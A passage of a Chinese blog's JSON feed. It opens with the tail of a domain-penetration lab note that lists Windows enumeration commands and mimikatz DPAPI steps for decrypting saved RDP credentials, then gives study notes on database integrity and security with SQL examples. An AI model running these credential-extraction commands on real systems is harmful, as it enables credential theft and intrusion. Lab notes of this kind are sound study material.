href=\"#查看组上的详细成员\">#</a> 查看组上的详细成员</h4>\n<pre><code>net group &quot;domain adminis&quot; /domain\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204207707.png\" alt=\"image-20221223204207707\" /></p>\n<h4 id=\"找域控\"><a class=\"anchor\" href=\"#找域控\">#</a> 找域控</h4>\n<pre><code>nltest /DCLIST:liuqi\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204720630.png\" alt=\"image-20221223204720630\" /></p>\n<p>使用这个工具可以找密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204806995.png\" alt=\"image-20221223204806995\" /></p>\n<h4 id=\"查看远程桌面的凭证\"><a class=\"anchor\" href=\"#查看远程桌面的凭证\">#</a> 查看远程桌面的凭证</h4>\n<pre><code>cmdkey list\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205107289.png\" alt=\"image-20221223205107289\" /></p>\n<p>我这里没有，登录一下，为后续继续实验铺垫</p>\n<h4 id=\"查看凭证文件的位置\"><a class=\"anchor\" href=\"#查看凭证文件的位置\">#</a> 查看凭证文件的位置</h4>\n<pre><code>dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205359052.png\" alt=\"image-20221223205359052\" /></p>\n<h4 id=\"破解凭证\"><a class=\"anchor\" href=\"#破解凭证\">#</a> 破解凭证</h4>\n<h5 id=\"获取guid\"><a class=\"anchor\" href=\"#获取guid\">#</a> 获取 guid</h5>\n<pre><code>mimikatz dpapi::cred /in:凭证路径\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205642671.png\" alt=\"image-20221223205642671\" /></p>\n<h5 id=\"找到guid对应的key\"><a class=\"anchor\" href=\"#找到guid对应的key\">#</a> 找到 guid 对应的 key</h5>\n<pre><code>mimikatz sekurlsa::dpapi\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205835271.png\" alt=\"image-20221223205835271\" /></p>\n<h5 id=\"解密凭证\"><a class=\"anchor\" href=\"#解密凭证\">#</a> 解密凭证</h5>\n<pre><code>mimikatz dpapi::cred /in:凭证的文件路径 /masterkey:masterkey的值\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223210136351.png\" alt=\"image-20221223210136351\" /></p>\n",
            "tags": [
                "内网",
                "域环境"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/",
            "url": "https://blog.xcu.icu/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/",
            "title": "数据库的完整性",
            "date_published": "2022-12-08T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>以此篇记录数据库系统概述的第五章，数据库完整性的学习</p>\n<p>数据库的完整性是指数据的 <code>正确性</code> 和 <code>相容性</code> ，为了维护数据库的完整性，数据库管理系统需要实现如下功能</p>\n<ol>\n<li>提供定义完整性约束条件的机制</li>\n<li>提供完整性检查的方法</li>\n<li>进行违约处理</li>\n</ol>\n<h2 id=\"实体完整性\"><a class=\"anchor\" href=\"#实体完整性\">#</a> 实体完整性</h2>\n<h3 id=\"实体完整性定义\"><a class=\"anchor\" href=\"#实体完整性定义\">#</a> 实体完整性定义</h3>\n<ul>\n<li>关系模型的实体完整性\n<ul>\n<li>create table 中用 PRIMARY KEY 定义</li>\n</ul>\n</li>\n<li>单属性构成的码有两种说明方法\n<ul>\n<li>定义为列级约束条件</li>\n<li>定义为表级约束条件</li>\n</ul>\n</li>\n<li>对多个属性构成的码只有一种说明方法\n<ul>\n<li>定义为表级约束条件</li>\n</ul>\n</li>\n</ul>\n<p><code>将Student表中的Sno属性定义为码</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> Student <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Sno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Sname <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Ssex <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Sage <span class=\"token keyword\">smallint</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    Sdept <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>将SC表中的Sno、Cno属性组定义为码</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> SC <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Sno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Cno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Grade <span class=\"token keyword\">smallint</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span> <span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Cno<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"实体完整性检查和违约处理\"><a class=\"anchor\" href=\"#实体完整性检查和违约处理\">#</a> 实体完整性检查和违约处理</h3>\n<p>插入或对主码进行更行操作时，RDBMS 按照实体完整性规则进行检查（通过 <code>全表扫描</code> 的方式进行）：</p>\n<ul>\n<li>检查主码是否唯一</li>\n<li>检查主码的各个属性是否为空</li>\n</ul>\n<h2 id=\"参照完整性\"><a class=\"anchor\" href=\"#参照完整性\">#</a> 参照完整性</h2>\n<ul>\n<li>在 create table 中用 foreign key 短语定义哪些列为外码</li>\n<li>用 references 短语指明这些外码参照哪些表的主码</li>\n</ul>\n<p>参照完整性的违约处理</p>\n<ul>\n<li>拒绝执行（默认）</li>\n<li>级联操作</li>\n<li>设置为空值</li>\n</ul>\n<h2 id=\"用户自定义完整性\"><a class=\"anchor\" href=\"#用户自定义完整性\">#</a> 用户自定义完整性</h2>\n<p>用户定义的完整性是针对某一个具体应用的数据必须满足的语义要去，由 RDBMS 提供，而不必由应用程序承担</p>\n<h3 id=\"属性上的约束条件\"><a class=\"anchor\" href=\"#属性上的约束条件\">#</a> 属性上的约束条件</h3>\n<p>CREATE TABLE 语句中：</p>\n<ul>\n<li>\n<p>列值非空（NOT NULL）</p>\n</li>\n<li>\n<p>列值唯一（unique）</p>\n<p><code>创建部门表DEPT，要去部门名称Dname列取唯一值，部门编号Deptno列为主码</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> DEPT <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Deptno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Dname <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">unique</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>检查列值是否满足一个布尔表达式（CHAECK）</p>\n<p><code>用check短语指定列值应该满足的条件，Student表的Ssex只允许取男或女</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> Student<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Sno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Sname <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Ssex cahr<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">check</span><span class=\"token punctuation\">(</span>Ssex <span class=\"token operator\">IN</span><span class=\"token punctuation\">(</span><span class=\"token string\">'男'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'女'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Sage <span class=\"token keyword\">smallint</span>，</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    Sdept cahr<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n</ul>\n<p><strong>注：属性上的约束条件检查和违约处理</strong></p>\n<p>插入元组或者修改属性时，RDBMS 检查属性上的约束条件是否被满足，如果不满足则被拒绝执行</p>\n<h3 id=\"元组上的约束条件的定义\"><a class=\"anchor\" href=\"#元组上的约束条件的定义\">#</a> 元组上的约束条件的定义</h3>\n<p>与同属性值限制相比，元组级的限制可以设置 <code>不同属性</code> 之间的取值的相互约束条件</p>\n<p><code>当学生的性别是男的时候，其名字不能以Ms. 开头</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> Student <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Sname <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Sno <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Ssex <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">check</span><span class=\"token punctuation\">(</span>Ssex<span class=\"token operator\">=</span><span class=\"token string\">'女'</span> <span class=\"token operator\">or</span> <span class=\"token operator\">not</span> <span class=\"token operator\">like</span> <span class=\"token string\">'Ms.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>修改需要使用 ALTER TABLE 语句修改表中的完整性限制，修改时需要先删除原来的约束条件，再增加新的约束条件</p>\n",
            "tags": [
                "数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/",
            "url": "https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/",
            "title": "数据库安全性",
            "date_published": "2022-12-05T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇记录学习数据库系统概论的第四章 -- 数据库安全性</p>\n<h2 id=\"数据库安全性概述\"><a class=\"anchor\" href=\"#数据库安全性概述\">#</a> 数据库安全性概述</h2>\n<p>数据库的安全性是指保护数据库中的数据，以防止不合法的使用导致数据库中数据的泄露，更改和破坏</p>\n<h3 id=\"数据库的不安全因素\"><a class=\"anchor\" href=\"#数据库的不安全因素\">#</a> 数据库的不安全因素</h3>\n<ol>\n<li>非授权用户对数据库的恶意存取和破坏</li>\n<li>数据库中安全或敏感的数据被泄露</li>\n<li>安全环境的脆弱性</li>\n</ol>\n<h3 id=\"安全标准\"><a class=\"anchor\" href=\"#安全标准\">#</a> 安全标准</h3>\n<p>桔皮书（TCSEC）和 CC 标准，是最具有影响力的两大准则，当下 CC 已经基本取代了 TCSEC 成为评估信息产品安全性的主要标准</p>\n<h4 id=\"tcsec标准\"><a class=\"anchor\" href=\"#tcsec标准\">#</a> TCSEC 标准</h4>\n<p>从四个方面来描述安全性级别划分的指标，即 <code>安全策略</code> ， <code>责任</code> ， <code>保证</code> 和 <code>文档</code></p>\n<p>下图是发展史</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141149070.png\" alt=\"image-20221206141149070\" /></p>\n<p>从这四个方面又划分出如下 7 个等级</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141110402.png\" alt=\"image-20221206141110402\" /></p>\n<p>安全级别从上往下越来越低，D 级包含了所有不符合更高标准的系统</p>\n<ul>\n<li>C1，能够实现用户和数据的分离，进行自主存取控制（DAC）</li>\n<li>C2，安全产品的最低档，提供受控的存取保护</li>\n<li>B1，对标记的主体和课题实施强制存取控制（MAC）以及审计等安全机制，被认为是真正意义上的安全产品</li>\n<li>B2 结构化保护</li>\n<li>B3，安全域</li>\n<li>A1，验证设计</li>\n</ul>\n<h4 id=\"cc标准\"><a class=\"anchor\" href=\"#cc标准\">#</a> CC 标准</h4>\n<p>国际公认的表述信息技术安全性的结构，主要由三个部分组成</p>\n<ol>\n<li>简介和一般模型</li>\n<li>安全功能要求</li>\n<li>安全保证要求</li>\n</ol>\n<p>他的安全级别也是划分为 7 个等级分别对应 TCSEC 安全级别</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206143134148.png\" alt=\"image-20221206143134148\" /></p>\n<h2 id=\"数据库安全性控制\"><a class=\"anchor\" href=\"#数据库安全性控制\">#</a> 数据库安全性控制</h2>\n<p>上面所记录仅做了解，接下来是本篇的重心部分</p>\n<p><code>再计算机系统中，安全措施是一级一级层层设置的</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206165609085.png\" alt=\"image-20221206165609085\" /></p>\n<p>这样如上图的一个验证过程</p>\n<p>数据库安全控制的常用方法</p>\n<ul>\n<li>用户身份鉴定</li>\n<li>存取控制</li>\n<li>视图</li>\n<li>审计</li>\n<li>数据加密</li>\n</ul>\n<h3 id=\"用户的身份鉴定\"><a class=\"anchor\" href=\"#用户的身份鉴定\">#</a> 用户的身份鉴定</h3>\n<p>用户标识通常由用户名和用户标识号两部分组成</p>\n<p>常用的身份鉴别方法</p>\n<ol>\n<li>静态口令鉴别：常用，简单但是安全性低</li>\n<li>动态口令鉴别：比较安全</li>\n<li>生物特征鉴别：较高的安全性</li>\n</ol>\n<h3 id=\"存取控制\"><a class=\"anchor\" href=\"#存取控制\">#</a> 存取控制</h3>\n<p>数据库安全性最重要的一点就是确保只有授权的用户能访问数据库</p>\n<p><code>存取控制的机制</code></p>\n<ul>\n<li>用户定义权限</li>\n<li>合法权限检查</li>\n<li>二者共同组成了 DBMS 的存取控制子系统</li>\n</ul>\n<h3 id=\"自主存取控制\"><a class=\"anchor\" href=\"#自主存取控制\">#</a> 自主存取控制</h3>\n<p>通过 SQL 语言的 <code>GRANT</code> （授予）和 <code>REVOKE</code> （收回）语句实现，用户的权限组成：数据库对象，操作类型</p>\n<p>定于用权限，定于用户可以在哪些表上面可以进行哪些操作，下表是关系数据库中的存储权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206174324541.png\" alt=\"image-20221206174324541\" /></p>\n<h3 id=\"授权和权限回收\"><a class=\"anchor\" href=\"#授权和权限回收\">#</a> 授权和权限回收</h3>\n<h4 id=\"授权\"><a class=\"anchor\" href=\"#授权\">#</a> 授权</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">GRANT</span> <span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">&lt;</span>对象类型<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>对象名<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>对象类型<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>对象名<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">TO</span> <span class=\"token operator\">&lt;</span>用户<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>用户<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WITH</span> <span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">/* 又最后一句话的时候证明权限是可以授予给他人的 */</span></pre></td></tr></table></figure><p><code>把查询Student的权限授予给用户U1</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">select</span> <span class=\"token keyword\">ON</span> Student <span class=\"token keyword\">to</span> U1<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>把对Student和Course的全部权限授予U2，U3</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">All</span> <span class=\"token keyword\">privileges</span> <span class=\"token keyword\">ON</span> Student<span class=\"token punctuation\">,</span>Course <span class=\"token keyword\">to</span> U2<span class=\"token punctuation\">,</span>U3<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>把对SC表的查询权限授予所有用户</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">select</span> <span class=\"token keyword\">on</span> SC <span class=\"token keyword\">to</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>把查询Student表和修改Sno的权限授予U4</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">select</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">update</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">on</span> Student <span class=\"token keyword\">to</span> U4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>对SC表的INSERT权限授予U5，且可再次授权</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">insert</span> <span class=\"token keyword\">on</span> SC <span class=\"token keyword\">to</span> U5 <span class=\"token keyword\">with</span> <span class=\"token keyword\">grant</span> <span class=\"token keyword\">option</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"权限收回\"><a class=\"anchor\" href=\"#权限收回\">#</a> 权限收回</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">REVOKE</span> <span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">&lt;</span>对象类型<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>对象名<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>对象类型<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>对象名<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>用户<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>用户<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>把用户U4修改学号的权限收回</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">revoke</span> <span class=\"token keyword\">update</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ON</span> Student <span class=\"token keyword\">from</span> U4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>收回所有用户对表SC的查询权限</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">revoke</span> <span class=\"token keyword\">select</span> <span class=\"token keyword\">ON</span> SC <span class=\"token keyword\">from</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>把用户U5对SC表的Insert权限收回</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">revoke</span> <span class=\"token keyword\">insert</span> <span class=\"token keyword\">on</span> SC <span class=\"token keyword\">from</span> U5 <span class=\"token keyword\">cascade</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#cascade 级联操作，收回 U5 授予出去的权限</span></pre></td></tr></table></figure><p>&lt;font color=red&gt; 用户可以自主决定将数据的存取权限授予任何人，决定是否也将授权的权限搜娱给别人，这样的存取控制称为用户自主存取控制 &lt;/font&gt;</p>\n<h3 id=\"数据库角色\"><a class=\"anchor\" href=\"#数据库角色\">#</a> 数据库角色</h3>\n<p>数据库角色是数据库权限的集合，为了简化授权过程，为一组具有相同权限的用户创建一个角色</p>\n<ol>\n<li>\n<p>角色的创建</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> ROLE <span class=\"token operator\">&lt;</span>角色名<span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>给角色授权</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">GRANT</span> <span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">ON</span> 对象名 <span class=\"token keyword\">TO</span> <span class=\"token operator\">&lt;</span>角色<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>角色<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>将一个角色授予其他的角色或用户</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">GRANT</span> <span class=\"token operator\">&lt;</span>角色<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>角色<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">TO</span> <span class=\"token operator\">&lt;</span>角色<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>用户<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WITH</span> ADMIN <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>角色权限的收回</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">REVOKE</span> <span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>权限<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">&lt;</span>对象类型<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>对象名<span class=\"token operator\">></span> <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>角色<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>角色<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n</ol>\n<p><code>通过角色来实现将一组权限搜娱一个用户</code></p>\n<ol>\n<li>\n<p>首先创建一个角色 R1</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> role R1<span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>然后使用 FRANT 语句，使角色 R1 拥有 Student 表的 SELECT，UPDATE，INSERT 权限</p>\n<figure class=\"highlight sql\"><figcaption 